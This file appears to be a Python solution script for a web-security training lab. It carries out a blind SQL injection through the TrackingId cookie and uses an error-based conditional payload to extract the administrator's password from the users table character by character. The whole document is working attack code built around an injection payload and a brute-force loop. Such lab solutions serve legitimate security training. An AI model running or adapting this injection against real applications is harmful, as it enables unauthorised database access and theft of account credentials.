import requests
letters=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']
url='https://0acc008004aca93cc0991c8800ea004e.web-security-academy.net/filter?category=Pets'
r=requests.get(url)
# print(r.cookie['TrackingId'])
first_cookie=r.cookies['TrackingId']
Cookie='5atdWgLpUO2zDAgG'
password=''
for i in range(1,21):
    for j in letters:
        final_cookie=Cookie+"'||(select case when substr(password,{},1)='{}' then to_char (1/0) else '' end from users where username='administrator') ||'".format(i,j)
        full_cookie={"TrackingId":final_cookie}
        print("**Trying {} position with {}".format(i,j))
        temp=requests.get(url,cookies=full_cookie)
        if temp.status_code>499:
            password+=j
            break
        print(password)
print(password)